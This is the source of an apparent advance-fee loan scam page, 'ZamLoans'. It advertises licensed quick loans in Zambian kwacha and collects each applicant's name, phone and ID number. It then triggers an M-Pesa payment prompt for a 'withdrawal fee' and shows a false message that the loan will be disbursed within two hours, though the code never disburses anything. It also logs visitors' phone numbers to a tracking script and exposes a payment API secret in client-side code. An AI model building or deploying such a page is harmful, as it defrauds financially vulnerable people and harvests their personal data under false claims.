<?php
// ZamLoans Application
ob_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
<title>ZamLoans | Quick Zambian Loans</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
<style>
  :root {
    --navy:    #2c3e50;
    --navy2:   #34495e;
    --gold:    #2980b9;
    --gold2:   #5dade2;
    --bg:      #f2f4f7;
    --white:   #ffffff;
    --border:  #dce1e9;
    --text:    #1c2833;
    --muted:   #707b8e;
    --radius:  10px;
    --shadow:  0 2px 14px rgba(44,62,80,0.08);
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }

  .page { display: none; }
  .page.active { display: block; }

  /* ── NAVBAR ── */
  .navbar {
    background: var(--navy);
    padding: 0 28px;
    display: flex; align-items: center; justify-content: space-between;
    height: 58px;
    position: sticky; top: 0; z-index: 50;
    box-shadow: 0 2px 12px rgba(0,0,0,0.2);
  }
  .navbar .brand { display: flex; align-items: center; gap: 10px; }
  .navbar .brand-icon {
    width: 32px; height: 32px; border-radius: 8px;
    background: linear-gradient(135deg, #2980b9, #5dade2);
    display: flex; align-items: center; justify-content: center;
    font-weight: 800; font-size: 0.9rem; color: white;
  }
  .navbar .brand-name { color: white; font-weight: 700; font-size: 1.05rem; letter-spacing: 0.01em; }
  .navbar .brand-name span { color: #5dade2; }
  .navbar .tagline { color: rgba(255,255,255,0.45); font-size: 0.75rem; }

  /* ── HERO ── */
  .hero-bar {
    background: linear-gradient(160deg, #2c3e50 0%, #34495e 60%, #2980b9 100%);
    padding: 52px 24px 64px;
    text-align: center;
    color: white;
    position: relative;
    overflow: hidden;
  }
  .hero-bar::before {
    content: '';
    position: absolute; inset: 0;
    background: radial-gradient(ellipse at 70% 50%, rgba(93,173,226,0.15) 0%, transparent 60%);
  }
  .hero-bar .hero-badge {
    display: inline-block;
    background: rgba(93,173,226,0.2);
    border: 1px solid rgba(93,173,226,0.4);
    color: #a9d4f0;
    font-size: 0.72rem; font-weight: 600;
    letter-spacing: 0.08em; text-transform: uppercase;
    padding: 5px 14px; border-radius: 20px; margin-bottom: 16px;
  }
  .hero-bar h1 { font-size: 2.6rem; font-weight: 800; margin-bottom: 14px; letter-spacing: -0.02em; position: relative; }
  .hero-bar h1 span { color: #5dade2; }
  .hero-bar p { font-size: 1rem; opacity: 0.75; max-width: 480px; margin: 0 auto; line-height: 1.65; position: relative; }

  /* ── PAGE HERO (inner pages) ── */
  .page-hero {
    background: linear-gradient(160deg, #2c3e50 0%, #34495e 100%);
    padding: 28px 24px 52px;
    text-align: center;
    color: white;
  }
  .page-hero h2 { font-size: 1.7rem; font-weight: 700; margin-bottom: 6px; letter-spacing: -0.01em; }
  .page-hero p  { font-size: 0.88rem; opacity: 0.7; }

  .back-btn {
    display: inline-flex; align-items: center; gap: 6px;
    background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
    color: rgba(255,255,255,0.85); border-radius: 20px;
    font-family: 'Inter', sans-serif; font-size: 0.82rem; font-weight: 500;
    cursor: pointer; margin-bottom: 18px; padding: 6px 14px;
    transition: background 0.2s;
  }
  .back-btn:hover { background: rgba(255,255,255,0.18); color: white; }

  /* ── FEATURES ── */
  .features {
    display: flex; gap: 14px;
    max-width: 920px;
    margin: -38px auto 0;
    padding: 0 24px;
    flex-wrap: wrap;
  }
  .feature-card {
    flex: 1 1 200px; background: var(--white);
    border-radius: var(--radius); padding: 18px 20px;
    display: flex; align-items: flex-start; gap: 14px;
    box-shadow: var(--shadow);
    border-top: 3px solid #2980b9;
  }
  .feature-icon {
    width: 40px; height: 40px; border-radius: 8px;
    background: #eef1f9;
    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
  }
  .feature-icon svg { width: 18px; height: 18px; }
  .feature-card h3 { font-size: 0.88rem; font-weight: 700; margin-bottom: 3px; color: var(--navy); }
  .feature-card p  { font-size: 0.78rem; color: var(--muted); line-height: 1.4; }

  /* ── LOAN SECTION ── */
  .loan-section { max-width: 980px; margin: 44px auto; padding: 0 24px; }
  .loan-section-header { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 8px; }
  .loan-section h2 { font-size: 1.45rem; font-weight: 700; color: var(--navy); }
  .loan-section > p { color: var(--muted); font-size: 0.85rem; margin-top: 4px; }
  .loan-count-badge { background: #2c3e50; color: #5dade2; font-size: 0.72rem; font-weight: 700; padding: 4px 12px; border-radius: 20px; }

  .loan-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(185px, 1fr));
    gap: 14px;
  }
  .loan-card {
    background: var(--white); border-radius: var(--radius); padding: 18px;
    border: 1.5px solid var(--border); cursor: pointer;
    transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
    position: relative; overflow: hidden;
  }
  .loan-card::after {
    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
    background: linear-gradient(90deg, var(--navy), var(--navy2));
    opacity: 0; transition: opacity 0.2s;
  }
  .loan-card:hover { border-color: var(--navy); box-shadow: 0 6px 20px rgba(10,31,68,0.12); transform: translateY(-2px); }
  .loan-card:hover::after { opacity: 1; }
  .loan-card.selected { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(201,168,76,0.2); }
  .loan-card.selected::after { opacity: 1; background: linear-gradient(90deg, var(--gold), var(--gold2)); }
  .loan-card .label  { font-size: 0.7rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 6px; }
  .loan-card .amount { font-size: 1.4rem; font-weight: 800; color: var(--navy); margin-bottom: 12px; letter-spacing: -0.02em; }
  .loan-card .fee-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; padding-top: 10px; border-top: 1px solid var(--border); }
  .loan-card .fee-label { font-size: 0.72rem; color: var(--muted); }
  .loan-card .fee-value { font-size: 0.82rem; font-weight: 700; color: var(--gold); }
  .btn-select {
    width: 100%; padding: 9px;
    background: transparent; border: 1.5px solid var(--border);
    border-radius: 8px; font-family: 'Inter', sans-serif;
    font-size: 0.82rem; font-weight: 600; cursor: pointer; color: var(--navy);
    transition: background 0.2s, border-color 0.2s, color 0.2s;
  }
  .btn-select:hover { background: var(--navy); border-color: var(--navy); color: white; }

  @media (max-width: 600px) {
    .loan-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
    .loan-card { padding: 13px; }
    .loan-card .amount { font-size: 1.1rem; }
    .loan-card .label  { font-size: 0.68rem; }
    .loan-card .fee-value { font-size: 0.76rem; }
    .btn-select { padding: 7px; font-size: 0.78rem; }
    .loan-section { margin: 30px auto; }
  }

  /* ── FORM CARDS ── */
  .card-wrap { max-width: 540px; margin: -28px auto 0; padding: 0 20px 60px; }
  .white-card {
    background: var(--white); border-radius: var(--radius);
    padding: 30px; box-shadow: var(--shadow);
    border: 1px solid var(--border);
  }
  .white-card h3 {
    font-size: 1rem; font-weight: 700; margin-bottom: 22px;
    color: var(--navy); padding-bottom: 14px;
    border-bottom: 2px solid var(--gold);
    display: inline-block;
  }

  .field { margin-bottom: 18px; }
  .field label { display: block; font-size: 0.8rem; font-weight: 600; margin-bottom: 6px; color: var(--navy); text-transform: uppercase; letter-spacing: 0.04em; }
  .field label span { color: #e53e3e; }
  .field input, .field select {
    width: 100%; padding: 11px 14px;
    border: 1.5px solid var(--border); border-radius: 8px;
    font-family: 'Inter', sans-serif; font-size: 0.9rem;
    color: var(--text); outline: none; background: #fafbfd;
    transition: border-color 0.2s, background 0.2s;
  }
  .field input:focus, .field select:focus { border-color: var(--navy); background: white; }
  .field input::placeholder { color: #b0b8cc; }
  .field select {
    appearance: none;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
    background-repeat: no-repeat; background-position: right 14px center; background-color: #fafbfd;
  }

  .btn-primary {
    width: 100%; padding: 13px;
    background: linear-gradient(135deg, var(--navy), var(--navy2)); color: white; border: none;
    border-radius: 8px; font-family: 'Inter', sans-serif;
    font-size: 0.95rem; font-weight: 700; cursor: pointer; letter-spacing: 0.02em;
    transition: opacity 0.2s, transform 0.15s; margin-top: 6px;
    box-shadow: 0 4px 14px rgba(41,128,185,0.3);
  }
  .btn-primary:hover { opacity: 0.92; transform: translateY(-1px); }
  .btn-primary:active { transform: scale(0.98); }
  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

  /* ── WITHDRAW SUMMARY ── */
  .summary-box {
    background: #f4f6fb; border-radius: 8px;
    overflow: hidden; margin-bottom: 20px;
    border: 1px solid var(--border);
  }
  .summary-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: 12px 16px; font-size: 0.88rem;
  }
  .summary-row + .summary-row { border-top: 1px solid var(--border); }
  .summary-row .s-label { color: var(--muted); }
  .summary-row .s-val   { font-weight: 700; color: var(--navy); }
  .summary-row .s-val.gold { color: var(--gold); }

  .pay-info { font-size: 0.85rem; color: var(--muted); margin-bottom: 18px; line-height: 1.6; }
  .pay-info strong { color: var(--navy); }

  .status-msg {
    margin-top: 12px; padding: 11px 14px;
    border-radius: 8px; font-size: 0.82rem; line-height: 1.5; display: none;
  }
  .status-msg.show    { display: block; }
  .status-msg.pending { background: #fefce8; color: #854d0e; border: 1px solid #fde047; }
  .status-msg.success { background: #f0fdf4; color: #166534; border: 1px solid #86efac; }
  .status-msg.error   { background: #fef2f2; color: #991b1b; border: 1px solid #fca5a5; }

  /* ── SUCCESS ── */
  .success-icon {
    width: 70px; height: 70px; border-radius: 50%;
    background: linear-gradient(135deg, var(--navy), var(--navy2));
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 22px;
    box-shadow: 0 6px 20px rgba(10,31,68,0.25);
  }
  .success-icon svg { width: 32px; height: 32px; }
  .text-center { text-align: center; }
  .congrats-title { font-size: 1.4rem; font-weight: 800; margin-bottom: 10px; color: var(--navy); letter-spacing: -0.01em; }
  .congrats-msg   { font-size: 0.9rem; color: var(--muted); line-height: 1.6; margin-bottom: 6px; }
  .congrats-msg strong { color: var(--navy); }
  .congrats-sub   { font-size: 0.84rem; color: #b0b8cc; margin-bottom: 28px; }
  .divider { height: 1px; background: var(--border); margin: 20px 0; }

  /* ── FOOTER ── */
  .footer {
    background: var(--navy); color: rgba(255,255,255,0.4);
    text-align: center; padding: 18px; font-size: 0.75rem; margin-top: 40px;
  }
  .footer span { color: #5dade2; }

  @media (max-width: 600px) {
    .hero-bar h1 { font-size: 1.9rem; }
    .features { margin-top: -22px; }
    .card-wrap { margin-top: -18px; padding: 0 14px 50px; }
    .white-card { padding: 22px 16px; }
    .page-hero { padding: 22px 18px 44px; }
    .navbar { padding: 0 16px; }
  }
</style>
</head>
<body>

<!-- ══ NAVBAR ══ -->
<nav class="navbar">
  <div class="brand">
    <div class="brand-icon">Z</div>
    <div>
      <div class="brand-name">Zam<span>Loans</span></div>
    </div>
  </div>
  <div class="tagline">Trusted · Fast · Secure</div>
</nav>

<!-- ══ PAGE 1: HOME ══ -->
<div id="page-home" class="page active">
  <div class="hero-bar">
    <div class="hero-badge">🏦 Licensed Digital Lender</div>
    <h1>Loans Made <span>Simple</span></h1>
    <p>Quick Zambian loans with simple fees. Choose your amount, pay the fee, and get funded within hours.</p>
  </div>

  <div class="features">
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#0a1f44" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
        </svg>
      </div>
      <div><h3>Fast Approval</h3><p>Get your loan approved within 24 hours</p></div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#0a1f44" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
      </div>
      <div><h3>Secure Process</h3><p>Your data is protected with encryption</p></div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#0a1f44" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
        </svg>
      </div>
      <div><h3>Low Fees</h3><p>Transparent fees with no hidden charges</p></div>
    </div>
  </div>

  <div class="loan-section">
    <div class="loan-section-header">
      <div>
        <h2>Choose Your Loan</h2>
        <p>Select a loan amount in ZMW. Each loan has a different withdrawal fee.</p>
      </div>
      <div class="loan-count-badge">16 Options</div>
    </div>
    <div class="loan-grid" id="loan-grid"></div>
  </div>
  <div class="footer">© 2025 <span>ZamLoans</span> · All rights reserved · Licensed Digital Lender</div>
</div>

<!-- ══ PAGE 2: APPLICATION FORM ══ -->
<div id="page-apply" class="page">
  <div class="page-hero">
    <button class="back-btn" onclick="goHome()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg>
      Back to Loans
    </button>
    <h2 id="apply-title">Apply for ZMW 1,000 Loan</h2>
    <p id="apply-fee">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card">
      <h3>Personal Details</h3>
      <div class="field">
        <label>Full Name <span>*</span></label>
        <input type="text" id="full-name" placeholder="e.g. Mulenga Banda" />
      </div>
      <div class="field">
        <label>Phone Number <span>*</span></label>
        <input type="tel" id="phone" placeholder="e.g. MTN/Safaricom 0971234567" />
      </div>
      <div class="field">
        <label>ID Number <span>*</span></label>
        <input type="text" id="id-number" placeholder="e.g. 12345678" />
      </div>
      <div class="field">
        <label>Type of Loan <span>*</span></label>
        <select id="loan-type">
          <option value="" disabled selected>Select loan type</option>
          <option>Personal Loan</option>
          <option>Business Loan</option>
          <option>Emergency Loan</option>
          <option>Agricultural Loan</option>
        </select>
      </div>
      <button class="btn-primary" onclick="submitApplication()">Submit Application</button>
    </div>
  </div>
</div>

<!-- ══ PAGE 3: WITHDRAW ══ -->
<div id="page-withdraw" class="page">
  <div class="page-hero">
    <button class="back-btn" onclick="showPage('page-apply')">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg>
      Back to Loans
    </button>
    <h2 id="withdraw-title">Apply for ZMW 1,000 Loan</h2>
    <p id="withdraw-fee-hero">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card">
      <h3>Withdraw Your Loan</h3>

      <div class="summary-box">
        <div class="summary-row">
          <span class="s-label">Loan Amount</span>
          <span class="s-val" id="w-loan-amount">ZMW 1,000</span>
        </div>
        <div class="summary-row">
          <span class="s-label">Withdrawal Fee</span>
          <span class="s-val green" id="w-fee-amount">ZMW 200</span>
        </div>
      </div>

      <p class="pay-info">Pay the withdrawal fee of <strong id="w-fee-inline">ZMW 200</strong> via M-Pesa to release your funds.</p>

      <div class="field">
        <label>M-Pesa Phone Number <span>*</span></label>
        <input type="tel" id="mpesa-phone" placeholder="e.g. 0712345678" />
      </div>

      <button class="btn-primary" id="pay-btn" onclick="onWithdraw()">Pay <span id="pay-btn-label">ZMW 200</span> &amp; Withdraw</button>

      <div class="status-msg" id="paymentStatus"></div>
    </div>
  </div>
</div>

<!-- ══ PAGE 4: SUCCESS ══ -->
<div id="page-success" class="page">
  <div class="page-hero">
    <h2 id="success-title">Apply for ZMW 1,000 Loan</h2>
    <p id="success-fee">Withdrawal Fee: ZMW 200</p>
  </div>

  <div class="card-wrap">
    <div class="white-card text-center">
      <div class="success-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/><polyline points="8 12 11 15 16 9"/>
        </svg>
      </div>
      <p class="congrats-title">Congratulations!</p>
      <p class="congrats-msg">Your loan of <strong id="success-amount">ZMW 1,000</strong> has been processed successfully.</p>
      <p class="congrats-sub">Please proceed to the withdrawal stage to receive your funds.</p>
      <button class="btn-primary" onclick="goHome()">Back to Home</button>
    </div>
  </div>
</div>

<script>
  const NESTLINK_API_SECRET = '2574c18e32d6fc1d49179858';
  const API_BASE = 'https://api.nestlink.co.ke';

  function formatPhone(phone) {
    let c = phone.replace(/\D/g, '');
    if (c.startsWith('0')) c = '254' + c.substring(1);
    else if (c.length === 9 && c.startsWith('7')) c = '254' + c;
    if (!(c.startsWith('254') && c.length === 12)) throw new Error('Use format 07xxxxxxxx or 2547xxxxxxxx');
    if (!c.match(/^2547\d{8}$/)) throw new Error('Enter a valid Safaricom number');
    return c;
  }

  async function sendStkPush(phone, amount, desc) {
    const formatted = formatPhone(phone);
    const local_id = `ZAMLOANS_${Date.now()}_${Math.floor(Math.random()*10000)}`;
    const res = await fetch(`${API_BASE}/runPrompt`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Api-Secret': NESTLINK_API_SECRET },
      body: JSON.stringify({ phone: formatted, amount, local_id, transaction_desc: desc })
    });
    const data = await res.json();
    if (!res.ok || data.status !== true) throw new Error(data.msg || 'STK push failed');
    return data;
  }

  const loans = [
    { amount: 500,   fee: 150  },
    { amount: 1000,  fee: 200  },
    { amount: 1500,  fee: 250  },
    { amount: 2000,  fee: 300  },
    { amount: 2500,  fee: 350  },
    { amount: 3000,  fee: 400  },
    { amount: 3500,  fee: 450  },
    { amount: 3800,  fee: 500  },
    { amount: 4500,  fee: 600  },
    { amount: 5000,  fee: 650  },
    { amount: 6000,  fee: 750  },
    { amount: 7500,  fee: 850  },
    { amount: 10000, fee: 950  },
    { amount: 12000, fee: 1100 },
    { amount: 15000, fee: 1300 },
    { amount: 20000, fee: 1600 },
  ];

  let selectedLoan = null;
  function fmt(n) { return n.toLocaleString(); }

  function renderLoans() {
    const grid = document.getElementById('loan-grid');
    grid.innerHTML = '';
    loans.forEach((loan, i) => {
      const card = document.createElement('div');
      card.className = 'loan-card';
      card.id = 'loan-' + i;
      card.innerHTML = `
        <div class="label">Loan Amount</div>
        <div class="amount">ZMW ${fmt(loan.amount)}</div>
        <div class="fee-row">
          <span class="fee-label">Withdrawal Fee</span>
          <span class="fee-value">ZMW ${fmt(loan.fee)}</span>
        </div>
        <button class="btn-select" onclick="selectLoan(${i})">Select Loan</button>
      `;
      grid.appendChild(card);
    });
  }

  function selectLoan(index) {
    selectedLoan = loans[index];
    document.querySelectorAll('.loan-card').forEach(c => c.classList.remove('selected'));
    document.getElementById('loan-' + index).classList.add('selected');
    document.getElementById('apply-title').textContent = `Apply for ZMW ${fmt(selectedLoan.amount)} Loan`;
    document.getElementById('apply-fee').textContent   = `Withdrawal Fee: ZMW ${fmt(selectedLoan.fee)}`;
    showPage('page-apply');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function submitApplication() {
    const name  = document.getElementById('full-name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const id    = document.getElementById('id-number').value.trim();
    const type  = document.getElementById('loan-type').value;
    if (!name || !phone || !id || !type) { alert('Please fill in all required fields.'); return; }

    const a = selectedLoan.amount, f = selectedLoan.fee;
    // Track form submission
    track({ action: 'form_submit' });
    document.getElementById('withdraw-title').textContent    = `Apply for ZMW ${fmt(a)} Loan`;
    document.getElementById('withdraw-fee-hero').textContent = `Withdrawal Fee: ZMW ${fmt(f)}`;
    document.getElementById('w-loan-amount').textContent     = `ZMW ${fmt(a)}`;
    document.getElementById('w-fee-amount').textContent      = `ZMW ${fmt(f)}`;
    document.getElementById('w-fee-inline').textContent      = `ZMW ${fmt(f)}`;
    document.getElementById('pay-btn-label').textContent     = `ZMW ${fmt(f)}`;
    document.getElementById('mpesa-phone').value = '';
    resetStatus();

    showPage('page-withdraw');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  async function onWithdraw() {
    const phone = document.getElementById('mpesa-phone').value.trim();
    if (!phone) { alert('Please enter your M-Pesa phone number.'); return; }

    const btn = document.getElementById('pay-btn');
    btn.disabled = true;
    btn.textContent = '⏳ Sending M-Pesa request…';
    setStatus('pending', '⏳ Sending STK push to your phone…');

    // Track payment attempt
    track({ action: 'payment_attempt', amount: selectedLoan.amount, fee: selectedLoan.fee, phone, status: 'pending' });

    try {
      await sendStkPush(phone, selectedLoan.fee,
        `ZamLoans - Pay fee ZMW ${fmt(selectedLoan.fee)} to receive ZMW ${fmt(selectedLoan.amount)} loan`);
      setStatus('success',
        `✅ M-Pesa prompt sent! Enter your PIN to pay ZMW ${fmt(selectedLoan.fee)}. Your loan of ZMW ${fmt(selectedLoan.amount)} will be disbursed within 2 hours.`);
      btn.textContent = 'Payment Initiated ✓';

      // Track success
      track({ action: 'payment_result', status: 'success', amount: selectedLoan.amount, fee: selectedLoan.fee });

      setTimeout(() => {
        document.getElementById('success-title').textContent  = `Apply for ZMW ${fmt(selectedLoan.amount)} Loan`;
        document.getElementById('success-fee').textContent    = `Withdrawal Fee: ZMW ${fmt(selectedLoan.fee)}`;
        document.getElementById('success-amount').textContent = `ZMW ${fmt(selectedLoan.amount)}`;
        showPage('page-success');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }, 3000);

    } catch (err) {
      setStatus('error', `❌ ${err.message}`);
      // Track failure
      track({ action: 'payment_result', status: 'error', amount: selectedLoan.amount, fee: selectedLoan.fee });
      btn.disabled = false;
      btn.innerHTML = `Pay <span id="pay-btn-label">ZMW ${fmt(selectedLoan.fee)}</span> &amp; Withdraw`;
    }
  }

  function setStatus(type, msg) {
    const d = document.getElementById('paymentStatus');
    d.className = `status-msg show ${type}`;
    d.textContent = msg;
  }
  function resetStatus() {
    const d = document.getElementById('paymentStatus');
    d.className = 'status-msg';
    d.textContent = '';
  }
  function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
  }
  function goHome() {
    ['full-name','phone','id-number'].forEach(id => document.getElementById(id).value = '');
    document.getElementById('loan-type').value = '';
    showPage('page-home');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // ── TRACKING ──
  function track(payload) {
    fetch('track.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  // Track page visit
  track({ action: 'visit', referrer: document.referrer, page: '/' });

  // Patch selectLoan to track loan clicks
  const _origSelectLoan = selectLoan;
  window.selectLoan = function(index) {
    track({ action: 'loan_click', amount: loans[index].amount, fee: loans[index].fee });
    _origSelectLoan(index);
  };

  renderLoans();
</script>
</body>
</html>
<?php
$html = ob_get_clean();
// Safe minification - only collapse whitespace between HTML tags, not inside JS
$html = preg_replace('/<!--.*?-->/s', '', $html);
$html = preg_replace('/>\s+</', '><', $html);
echo $html;
?>
